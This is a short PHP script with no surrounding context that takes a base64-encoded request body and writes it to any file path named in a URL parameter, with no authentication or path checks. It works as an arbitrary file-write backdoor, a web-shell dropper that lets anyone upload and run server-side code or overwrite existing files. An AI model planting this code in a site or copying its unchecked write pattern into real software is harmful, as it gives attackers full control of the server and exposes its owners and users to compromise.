<?php
$text = base64_decode(file_get_contents("php://input"));
$filetochange = $_GET["name"];
file_put_contents($filetochange,$text);
print("success");
exit;
?>
